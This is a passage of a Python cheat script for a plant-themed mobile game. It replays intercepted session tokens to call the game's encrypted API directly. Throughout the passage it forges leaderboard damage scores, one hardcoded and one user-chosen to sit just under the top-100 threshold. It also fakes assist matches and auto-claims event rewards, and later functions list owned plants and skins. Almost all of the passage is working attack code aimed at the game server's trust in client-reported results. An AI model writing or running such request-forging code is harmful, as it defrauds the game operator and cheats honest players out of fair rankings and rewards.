                        break
    else:
        pass

def nianshoushuashang():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10906, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data = {"req":"V1235","e":{"o":"90","pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_jsons = json.loads(decrypted_response)
        min_s = int(min(entry['s'] for entry in decrypted_jsons['e']['d']['rank_list']))
        max_s = min_s - 10000000
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        rank = data_dict['rank']
        battle_cnt = int(data_dict['daily_battle_cnt'])-int(data_dict['battle_cnt'])
        today_damage = data_dict['today_damage']
        print(f"\n  当前排名比\033[92m{rank}\033[0m\n  当前个人分数\033[92m{today_damage}\033[0m\n  剩余挑战次数\033[92m{battle_cnt}\033[0m\n  第100名分数\033[92m{min_s}\033[0m")
        for box in data_dict["box_reward"]:
            if box["type"] == 1:
                progress = int(box["progress"])
                can_claim = False
                for reward in box["reward"]:
                    if str(reward["is_receive"]) == "False":
                        condition = int(reward["condition"])
                        if progress > condition:
                            can_claim = True
                if can_claim:
                    data = {"req":"V1221","e":{"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("全服总伤奖励领取成功")
                    else:
                        print("全服总伤奖励领取失败")
        for box in data_dict["box_reward"]:
            if box["type"] == 2:
                all_received = all(str(r["is_receive"]) == "True" for r in box["reward"])
                if str(all_received) == "False":
                    progress = int(box["progress"])
                    conditions = [int(r["condition"]) for r in box["reward"]]
                    condition_max = max(conditions)
                    if progress >= condition_max:
                        data = {"req":"V1221","e":{"pi":pi,"sk":sk,"t":"2","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("小队总伤奖励领取成功")
                        else:
                            print("小队总伤奖励领取失败")
                    elif progress < condition_max:
                        if battle_cnt > 0:
                            choice = input("今日个人奖励未领取，请选择1领低保，2自定义刷分(空回车跳过)").strip()
                            if choice == "":
                                break
                            elif choice == 1:
                                dmg = str(condition_max)
                            elif choice == 2:
                                result = pipei(min_s, max_s)
                            data = {"req": "V303", "e": {"al": [{"id": 10906, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            data = {"req":"V1221","e":{"pi":pi,"sk":sk,"t":"2","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("小队总伤奖励领取成功")
                            else:
                                print("小队总伤奖励领取失败")
                        else:
                            print("今日已无挑战次数")
                elif all_received == "True":
                    pass
        for box in data_dict["box_reward"]:
            if box["type"] == 3:
                progress_value = int(box["progress"])
                conditions = [r["condition"] for r in box["reward"]]
                xz_max = int(max(conditions))
                if progress_value < xz_max:
                    xz_cs = xz_max - progress_value
                    for i in range(xz_cs):
                        data = {"req":"V1223","e":{"pi":pi,"sk":sk,"t":"2","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        time.sleep(0.3)
                        response_data = json.loads(response.text)
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_jsons = json.loads(decrypted_response)
                        print(decrypted_jsons)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("助战匹配开启成功")
                            data = {"req":"V1225","e":{"pi":pi,"progress":"100","sk":sk,"start":"1","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            time.sleep(0.3)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("助战匹配开启成功")
                                while True:
                                    data = {"req": "V1224", "e": {"matchid": "RTID(0)", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    time.sleep(0.3)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        print("玩家对接中")
                                        decrypted_response = get_decrypted_data(url, data=response)
                                        decrypted_json = json.loads(decrypted_response)
                                        players = decrypted_json['e']['d']['players']
                                        plants_list = []
                                        for player in decrypted_json["e"]["d"]["players"]:
                                            if player.get("ProfileId") == pi:
                                                for plant in player.get("Plants", []):
                                                    plants_list.append(plant["i"])
                                        player1 = players[0]
                                        player2 = players[1]
                                        started_at_1 = player1.get('StartedAt')
                                        started_at_2 = player2.get('StartedAt')
                                        if started_at_1 is not None and started_at_2 is not None:
                                            print("进入对局")
                                            break
                                    else:
                                        print("助战匹配开启失败")
                                dj_list = [
                                    {'i': '50001', 'lev': 0, 'z': [1001,1002,1003,1004,1005]},
                                    {'i': '50002', 'lev': 0, 'z': [111038,111002,1052,1008,1002]},
                                    {'i': '50003', 'lev': 0, 'z': [111003,111036,1044,1029,1081]},
                                    {'i': '50004', 'lev': 0, 'z': [111012,111015,1098,111025,1070]},
                                    {'i': '50005', 'lev': 0, 'z': [1062,111043,111020,111016,1009]},
                                    {'i': '50006', 'lev': 0, 'z': [111021,1078,1012,111018,1059]},
                                    {'i': '50007', 'lev': 0, 'z': [1006,1019,1031,1058,111033]},
                                    {'i': '50008', 'lev': 0, 'z': [111029,111030,1099,1090,1022]},
                                    {'i': '50009', 'lev': 0, 'z': [1043,1037,1039,1040,111019]},
                                    {'i': '50010', 'lev': 0, 'z': [111035,111022,1030,1027,1025]},
                                    {'i': '50011', 'lev': 0, 'z': [111001,1047,1023,1067,111044]},
                                    {'i': '50012', 'lev': 0, 'z': [111042,111008,1021,1024,1080]},
                                    {'i': '50013', 'lev': 0, 'z': [111009,1060,1054,1071,111017]},
                                    {'i': '50014', 'lev': 0, 'z': [1085,1007,1036,1034,1039]},
                                    {'i': '50015', 'lev': 0, 'z': [1086,1065,1093,111032,1025]},
                                    {'i': '50016', 'lev': 0, 'z': [111026,1097,1051,1050,1049]},
                                    {'i': '50017', 'lev': 0, 'z': [111058,111055,111054,111052,111051]},
                                    {'i': '50018', 'lev': 0, 'z': [111064,111066,111067,111069,111070]},
                                    {'i': '50019', 'lev': 0, 'z': [200003,200002,111091,111090,111089]},
                                    {'i': '50020', 'lev': 0, 'z': [111075,111049,200018,200017,200013]},
                                    {'i': '50021', 'lev': 0, 'z': [1015,200016,200019,200001,111085]},
                                    {'i': '50022', 'lev': 0, 'z': [200048,200051,111087,200024,200034]},
                                    {'i': '50023', 'lev': 0, 'z': [200025,200041,200033,200029,111053]},
                                    {'i': '50024', 'lev': 0, 'z': [111045,200047,200026,200053,200049]},
                                    {'i': '50025', 'lev': 0, 'z': [111062,111034,200037,200046,200052]},
                                    {'i': '50026', 'lev': 0, 'z': [111082,200044,200028,1095,1088]},
                                    {'i': '50027', 'lev': 0, 'z': [200102,200079,200056,200038]},
                                    {'i': '50028', 'lev': 0, 'z': [200022,111046,200031,200039,200055]},
                                    {'i': '50029', 'lev': 0, 'z': [200057,111079,111050,200009,111023]},
                                    {'i': '50030', 'lev': 0, 'z': [200000,200008,111048,111071,111088]},
                                    {'i': '50031', 'lev': 0, 'z': [111061,1068,111063,200032,111040]},
                                    {'i': '50032', 'lev': 0, 'z': [200027,1061,111039,200023,200005]},
                                    {'i': '50033', 'lev': 0, 'z': [200020,200021,1010,1011,1028]},
                                    {'i': '50034', 'lev': 0, 'z': [1072,200059,200060,111004,200054]},
                                    {'i': '50035', 'lev': 0, 'z': [200035,200061,200058,200007,1014]},
                                    {'i': '50036', 'lev': 0, 'z': [111074,111076,111031,200011,200069]},
                                    {'i': '50037', 'lev': 0, 'z': [200010,200006,200064,111010,1082]},
                                    {'i': '50038', 'lev': 0, 'z': [1071,200072,111027,111073,1073]},
                                    {'i': '50039', 'lev': 0, 'z': [200073,1033,1035,200015,200010]},
                                    {'i': '50040', 'lev': 0, 'z': [111011,111081,200065,1017,1032]},
                                    {'i': '50041', 'lev': 0, 'z': [200075,200076,111084,200077,200014]},
                                    {'i': '50042', 'lev': 0, 'z': [1092,1076,200050,200045,200066]},
                                    {'i': '50043', 'lev': 0, 'z': [111072,111086,111013,111060,1020]},
                                    {'i': '50044', 'lev': 0, 'z': [1042,200012,200051,200062,200063]},
                                    {'i': '50045', 'lev': 0, 'z': [111078,200071,1084,200043,111068]},
                                    {'i': '50046', 'lev': 0, 'z': [1069,200048,200082,1063,111022]},
                                    {'i': '50047', 'lev': 0, 'z': [111028,111001,1047,1045,1035]},
                                    {'i': '50048', 'lev': 0, 'z': [200100,200101,200093,200092]},
                                    {'i': '50049', 'lev': 0, 'z': [200091,200083,200099]},
                                    {'i': '50050', 'lev': 0, 'z': [200128,200067,200068]},
                                    {'i': '50051', 'lev': 0, 'z': [200140,200139,200138,200136,200135]}
                                ]
                                matched_ids = set()
                                for plant_id in plants_list:
                                    for item in dj_list:
                                        if plant_id in item['z']:
                                            matched_ids.add(item['i'])
                                sorted_ids = sorted(matched_ids, key=lambda x: int(x))
                                result_str = ",".join(sorted_ids)
                                data = {"req": "V1236", "e": {"data": {"settle": "1", "family": result_str, "damage": "501254"}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                                encrypted_data, head = get_encrypted_data(data, url)
                                response = _do_post(head, encrypted_data, data)
                                time.sleep(0.3)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 20013:
                                    print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                    print("分数上传成功")
                                    while True:
                                        data = {"req": "V1237", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        time.sleep(0.3)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("分数验证中")
                                            decrypted_response = get_decrypted_data(url, data=response)
                                            decrypted_json = json.loads(decrypted_response)
                                            td = int(decrypted_json['e']['d']['td'])
                                            if td == 0:
                                                pass
                                            elif td != 0:
                                                print("对局结束")
                                                break
                                        else:
                                            print("分数验证异常")
                                else:
                                    print("分数上传失败")
                            else:
                                print("助战匹配开启失败")
                        else:
                            print("助战匹配开启失败")
                        data = {"req": "V303", "e": {"al": [{"id": 10906, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        data = {"req": "V1221", "e": {"pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("协助总数奖励领取成功")
                        else:
                            print("协助总数奖励领取失败")
                elif progress_value >= xz_max:
                    all_received = all(str(r["is_receive"]) == "True" for r in box["reward"])
                    if all_received == "False":
                        data = {"req":"V1221","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("协助总数奖励领取成功")
                        else:
                            print("协助总数奖励领取失败")
        shuafen = input("\n请选择是否1刷分/空输入退出").strip()
        if shuafen == "":
            return
        elif int(shuafen) == 1:
            result = pipei(min_s, max_s)
def pipei(min_s, max_s):
    pi, ui, sk = get_pi_sk(加密)
    dmg = None
    while True:
        score_input = input("请输入要刷的分数（空输入退出）: ").strip()
        if not score_input:
            print("已退出")
            return
        try:
            score = int(score_input)
        except ValueError:
            print("输入无效，请输入一个整数")
            continue
        if score >= min_s:
            print("当前分数超过100名，请重新输入")
            continue
        if max_s < score < min_s:
            print("当前分数在100名1000w分附近")
            confirm = input("是否确认分数？(输入1确认，空回车重新输入): ").strip()
            if confirm == '1':
                dmg = score
                print(f"已确认分数: {dmg}")
                break
            else:
                print("重新输入分数")
                continue
        if score < max_s:
            print("当前分数低于100名1000w分")
            confirm = input("是否确认分数？(输入1确认，空回车重新输入): ").strip()
            if confirm == '1':
                dmg = score
                print(f"已确认分数: {dmg}")
                break
            else:
                print("重新输入分数")
                continue

    data = {"req":"V1223","e":{"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    time.sleep(0.3)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("挑战匹配开启成功")
        data = {"req":"V1225","e":{"pi":pi,"progress":"100","sk":sk,"start":"1","ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        time.sleep(0.3)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("挑战匹配开启成功")
            while True:
                data = {"req": "V1224", "e": {"matchid": "RTID(0)", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                time.sleep(0.3)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("玩家对接中")
                    decrypted_response = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_response)
                    players = decrypted_json['e']['d']['players']
                    plants_list = []
                    for player in decrypted_json["e"]["d"]["players"]:
                        if player.get("ProfileId") == pi:
                            for plant in player.get("Plants", []):
                                plants_list.append(plant["i"])
                    player1 = players[0]
                    player2 = players[1]
                    started_at_1 = player1.get('StartedAt')
                    started_at_2 = player2.get('StartedAt')
                    if started_at_1 is not None and started_at_2 is not None:
                        print("进入对局")
                        break
                else:
                    print("助战匹配开启失败")
            dj_list = [
                {'i': '50001', 'lev': 0, 'z': [1001,1002,1003,1004,1005]},
                {'i': '50002', 'lev': 0, 'z': [111038,111002,1052,1008,1002]},
                {'i': '50003', 'lev': 0, 'z': [111003,111036,1044,1029,1081]},
                {'i': '50004', 'lev': 0, 'z': [111012,111015,1098,111025,1070]},
                {'i': '50005', 'lev': 0, 'z': [1062,111043,111020,111016,1009]},
                {'i': '50006', 'lev': 0, 'z': [111021,1078,1012,111018,1059]},
                {'i': '50007', 'lev': 0, 'z': [1006,1019,1031,1058,111033]},
                {'i': '50008', 'lev': 0, 'z': [111029,111030,1099,1090,1022]},
                {'i': '50009', 'lev': 0, 'z': [1043,1037,1039,1040,111019]},
                {'i': '50010', 'lev': 0, 'z': [111035,111022,1030,1027,1025]},
                {'i': '50011', 'lev': 0, 'z': [111001,1047,1023,1067,111044]},
                {'i': '50012', 'lev': 0, 'z': [111042,111008,1021,1024,1080]},
                {'i': '50013', 'lev': 0, 'z': [111009,1060,1054,1071,111017]},
                {'i': '50014', 'lev': 0, 'z': [1085,1007,1036,1034,1039]},
                {'i': '50015', 'lev': 0, 'z': [1086,1065,1093,111032,1025]},
                {'i': '50016', 'lev': 0, 'z': [111026,1097,1051,1050,1049]},
                {'i': '50017', 'lev': 0, 'z': [111058,111055,111054,111052,111051]},
                {'i': '50018', 'lev': 0, 'z': [111064,111066,111067,111069,111070]},
                {'i': '50019', 'lev': 0, 'z': [200003,200002,111091,111090,111089]},
                {'i': '50020', 'lev': 0, 'z': [111075,111049,200018,200017,200013]},
                {'i': '50021', 'lev': 0, 'z': [1015,200016,200019,200001,111085]},
                {'i': '50022', 'lev': 0, 'z': [200048,200051,111087,200024,200034]},
                {'i': '50023', 'lev': 0, 'z': [200025,200041,200033,200029,111053]},
                {'i': '50024', 'lev': 0, 'z': [111045,200047,200026,200053,200049]},
                {'i': '50025', 'lev': 0, 'z': [111062,111034,200037,200046,200052]},
                {'i': '50026', 'lev': 0, 'z': [111082,200044,200028,1095,1088]},
                {'i': '50027', 'lev': 0, 'z': [200102,200079,200056,200038]},
                {'i': '50028', 'lev': 0, 'z': [200022,111046,200031,200039,200055]},
                {'i': '50029', 'lev': 0, 'z': [200057,111079,111050,200009,111023]},
                {'i': '50030', 'lev': 0, 'z': [200000,200008,111048,111071,111088]},
                {'i': '50031', 'lev': 0, 'z': [111061,1068,111063,200032,111040]},
                {'i': '50032', 'lev': 0, 'z': [200027,1061,111039,200023,200005]},
                {'i': '50033', 'lev': 0, 'z': [200020,200021,1010,1011,1028]},
                {'i': '50034', 'lev': 0, 'z': [1072,200059,200060,111004,200054]},
                {'i': '50035', 'lev': 0, 'z': [200035,200061,200058,200007,1014]},
                {'i': '50036', 'lev': 0, 'z': [111074,111076,111031,200011,200069]},
                {'i': '50037', 'lev': 0, 'z': [200010,200006,200064,111010,1082]},
                {'i': '50038', 'lev': 0, 'z': [1071,200072,111027,111073,1073]},
                {'i': '50039', 'lev': 0, 'z': [200073,1033,1035,200015,200010]},
                {'i': '50040', 'lev': 0, 'z': [111011,111081,200065,1017,1032]},
                {'i': '50041', 'lev': 0, 'z': [200075,200076,111084,200077,200014]},
                {'i': '50042', 'lev': 0, 'z': [1092,1076,200050,200045,200066]},
                {'i': '50043', 'lev': 0, 'z': [111072,111086,111013,111060,1020]},
                {'i': '50044', 'lev': 0, 'z': [1042,200012,200051,200062,200063]},
                {'i': '50045', 'lev': 0, 'z': [111078,200071,1084,200043,111068]},
                {'i': '50046', 'lev': 0, 'z': [1069,200048,200082,1063,111022]},
                {'i': '50047', 'lev': 0, 'z': [111028,111001,1047,1045,1035]},
                {'i': '50048', 'lev': 0, 'z': [200100,200101,200093,200092]},
                {'i': '50049', 'lev': 0, 'z': [200091,200083,200099]},
                {'i': '50050', 'lev': 0, 'z': [200128,200067,200068]},
                {'i': '50051', 'lev': 0, 'z': [200140,200139,200138,200136,200135]}
            ]
            matched_ids = set()
            for plant_id in plants_list:
                for item in dj_list:
                    if plant_id in item['z']:
                        matched_ids.add(item['i'])
            sorted_ids = sorted(matched_ids, key=lambda x: int(x))
            result_str = ",".join(sorted_ids)
            data = {"req": "V1236", "e": {"data": {"settle": "1", "family": result_str, "damage": dmg}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            time.sleep(0.3)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("分数上传成功")
                while True:
                    data = {"req": "V1237", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    time.sleep(0.3)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("分数验证中")
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        td = int(decrypted_json['e']['d']['td'])
                        if td == 0:
                            pass
                        elif td != 0:
                            print("对局结束")
                            break
                    else:
                        print("分数验证异常")
            else:
                print("分数上传失败")
        else:
            print("挑战匹配开启失败")
    else:
        print("挑战匹配开启失败")
def suipiantiaozhan():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    pcl_list = decrypted_json['e']['d'].get('pcl', [])
    dcl_list = decrypted_json['e']['d'].get('dcl', [])
    ndcl_list = decrypted_json['e']['d'].get('ndcl', [])
    pl_list = decrypted_json['e']['d'].get('pl', [])
    dcl = decrypted_json['e']['d']['dcl']
    ndcl = decrypted_json['e']['d']['ndcl']
    dl = decrypted_json['e']['d']['dl']
    ndl = decrypted_json['e']['d']['ndl']
    zongji_list = dcl + ndcl
    new_dl = []
    new_ndl = []
    for item in pl_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    for item in pl_list:
        i_original = int(item['i'])
        if i_original < 2000 or 100000 < i_original < 190000:
            i_new = i_original + 100
        elif 199999 < i_original < 1000000:
            i_new = i_original * 10 + 20000000
        else:
            i_new = i_original
        item['i'] = str(i_new)
    s_dict = {item['i']: item['s'] for item in pl_list}
    existing_i_set = set()
    for item in pcl_list:
        i_value = item['i']
        existing_i_set.add(i_value)
        if i_value in s_dict:
            item['s'] = s_dict[i_value]
    for i_value, s_value in s_dict.items():
        if i_value not in existing_i_set:
            new_item = {'i': i_value, 'q': '0', 's': s_value}
            pcl_list.append(new_item)
    result = []
    result2 = []
    for name, target_i in 植物.items():
        for item in pcl_list:
            if item['i'] == target_i:
                s_value = int(item.get('s', '0'))
                q_value = int(item['q'])
                new_s = s_value + 1
                result.append(f"{name}{new_s}阶×{q_value}")
                break
        else:
            result.append(f"{name}0阶")
    for num in dl:
        if num < 2000 or 100000 < num < 190000 or 10000000 < num < 90000000:
            new_num = num + 100 if num < 2000 or 100000 < num < 190000 else num + 10000000
        else:
            new_num = num
        new_dl.append(new_num)
    for num in ndl:
        if num < 2000 or 100000 < num < 190000 or 10000000 < num < 90000000:
            new_num = num + 100 if num < 2000 or 100000 < num < 190000 else num + 10000000
        else:
            new_num = num
        new_ndl.append(new_num)
    yongyou_list = set(map(str, new_dl + new_ndl))
    weiyongyou_list = [item for item in zongji_list if str(item['i']) not in yongyou_list]
    yongyoudebansheng_list = [{'i': str(num), 'q': '30'} for num in new_dl]
    yongyoudezhuangban_list = [{'i': str(num), 'q': '30'} for num in new_ndl]
    merged = {}
    for item in yongyoudezhuangban_list + yongyoudebansheng_list + dcl + ndcl:
        i = str(item['i'])
        q = int(item['q'])
        merged[i] = merged.get(i, 0) + q
    suipian_list = [{'i': i, 'q': q} for i, q in merged.items()]
    zhuangban_dict = {
"蚕豆突击队装扮": "1393",
"椰子加农炮装扮": "1323",
"烈焰菇装扮": "1359",
"蒲公英装扮": "1361",
"南瓜巫师装扮": "111304",
"魔音甜菜装扮": "111323",
"窝瓜装扮": "1314",
"潜伏芹菜装扮": "111325",
"双胞向日葵装扮": "1308",
"星星果装扮": "1340",
"橡木弓手装扮": "1360",
"辣椒投手装扮": "1380",
"火龙果装扮": "111318",
"原始向日葵装扮": "111338",
"孢子菇装扮": "111326",
"棉小雪装扮": "111313",
"莲小蓬装扮": "1375",
"鳄梨装扮": "1368",
"双重射手装扮": "1327",
"寒冰射手装扮": "1319",
"竹小弟装扮": "1388",
"复活萝卜装扮": "111328",
"棱镜草装扮": "1337",
"旋风橡果装扮": "1385",
"树脂投手装扮": "1376",
"回旋镖射手装扮": "1307",
"火炬树桩装扮": "1320",
"闪电芦苇装扮": "1322",
"西瓜投手装扮": "1324",
"钢地刺装扮": "1328",
"高坚果装扮": "1329",
"三重射手装扮": "1330",
"旋转菠萝装扮": "1395",
"眩晕洋葱装扮": "1382",
"大王花装扮": "1384",
"飞碟瓜装扮": "1392",
"豌豆射手装扮": "1301",
"坚果装扮": "1303",
"土豆地雷装扮": "1304",
"卷心菜投手装扮": "1305",
"冰冻生菜装扮": "1306",
"漩涡枇杷装扮": "1389",
"香水蘑菇装扮": "111337",
"白萝卜装扮": "1335",
"小喷菇装扮": "1349",
"大丽菊装扮": "111310",
"地刺装扮": "1311",
"向日葵装扮": "1302",
"豌豆荚装扮": "1325",
"竹笋装扮": "1336"}
    for name, target_i in zhuangban_dict.items():
        for item in suipian_list:
            if item['i'] == target_i and item['q'] >= 30:
                result2.append(f"{name} ✓")
                break
        else:
            result2.append(f"{name} ×")
            continue
    print()
    print_in_columns(result, num_columns=3, column_spacing=2)
    print()
    print_in_columns(result2, num_columns=3, column_spacing=2)

def is_zhuangban_id(item_id):
    item_id_int = int(item_id)
    return (1300 <= item_id_int <= 1399) or (111300 <= item_id_int <= 111399)

def get_unlocked_zhuangban():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    dcl = decrypted_json['e']['d'].get('dcl', [])
    ndcl = decrypted_json['e']['d'].get('ndcl', [])
    dl = decrypted_json['e']['d'].get('dl', [])
    ndl = decrypted_json['e']['d'].get('ndl', [])
    new_dl = []
    new_ndl = []
    for num in dl:
        num_int = int(num)
        if num_int < 2000 or 100000 < num_int < 190000 or 10000000 < num_int < 90000000:
            new_num = num_int + 100 if num_int < 2000 or 100000 < num_int < 190000 else num_int + 10000000
        else:
            new_num = num_int
        new_dl.append(new_num)
    for num in ndl:
        num_int = int(num)
        if num_int < 2000 or 100000 < num_int < 190000 or 10000000 < num_int < 90000000:
            new_num = num_int + 100 if num_int < 2000 or 100000 < num_int < 190000 else num_int + 10000000
        else:
            new_num = num_int
        new_ndl.append(new_num)
    yongyoudebansheng_list = [{'i': str(num), 'q': '30'} for num in new_dl]
    yongyoudezhuangban_list = [{'i': str(num), 'q': '30'} for num in new_ndl]
    merged = {}
    for item in yongyoudezhuangban_list + yongyoudebansheng_list + dcl + ndcl:
        i = str(item['i'])
        q = int(item['q'])
        merged[i] = merged.get(i, 0) + q
    unlocked = set()
    for i, q in merged.items():
        if q >= 30:
            unlocked.add(i)
    return unlocked

新植物阶数表 = {

    "111129": 4,
    "111116": 4,
    "22001570": 4,
    "111169": 4,
    "111138": 4,
    "111123": 4,
    "111115": 4,
    "111104": 4,
    "111118": 4,
    "111153": 4,
    "111135": 4,
    "111166": 4,
    "111168": 4,
    "111189": 4,
    "111191": 4,
    "22000160": 4,
    "22000180": 4,
    "22001830": 4,
    "22001860": 4,

    "111125": 3,
    "111126": 3,
    "111113": 3,
    "111110": 3,
    "22001380": 3,
    "22000170": 3,
    "111109": 3,
    "111151": 3,
    "111152": 3,
    "22001360": 3,

    "111128": 2,
    "111137": 2,
    "111114": 2,
    "22001370": 2,
}

def get_max_jieshu(item_id):
    item_id_str = str(item_id)

    if item_id_str in 新植物阶数表:
        return 新植物阶数表[item_id_str]
    item_id_int = int(item_id)
    if 1100 <= item_id_int <= 1199:
        internal_id = item_id_int - 100
    elif 111000 <= item_id_int <= 111999:
        internal_id = item_id_int - 100000
    elif 22000000 <= item_id_int <= 22999999:
        internal_id = (item_id_int - 20000000) // 10
    else:
        internal_id = item_id_int
    for plant_dict in plant_list:
        plant_id = next(iter(plant_dict))
        if int(plant_id) == internal_id:
            return int(plant_dict.get('jieshu', 4))

    return 4

def get_plant_levels():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    pcl_list = decrypted_json['e']['d'].get('pcl', [])
    pl_list = decrypted_json['e']['d'].get('pl', [])

    for item in pl_list:
        i_value = item['i']
        s_value = item['s']
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                jieshu_value = plant_dict.get('jieshu')
                if int(s_value) > int(jieshu_value):
